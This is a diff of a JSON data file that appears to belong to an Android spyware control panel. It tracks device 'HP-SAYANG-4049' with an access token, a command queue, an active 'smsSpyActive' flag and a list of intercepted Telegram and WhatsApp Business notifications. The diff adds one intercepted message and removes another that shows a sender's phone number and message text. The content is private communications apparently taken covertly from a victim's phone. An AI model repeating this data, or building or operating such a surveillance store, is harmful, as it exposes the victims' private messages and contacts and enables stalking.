@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636687295,
+    "lastSeen": 1775636690210,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 15:24",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636690676
+      },
       {
         "appName": "Telegram",
         "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
@@ -4318,14 +4326,6 @@
         "time": "08/04 14:28",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633331987
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "Lu online doang anjing",
-        "time": "08/04 14:28",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633331756
       }
     ],
     "galleryPhotos": [],
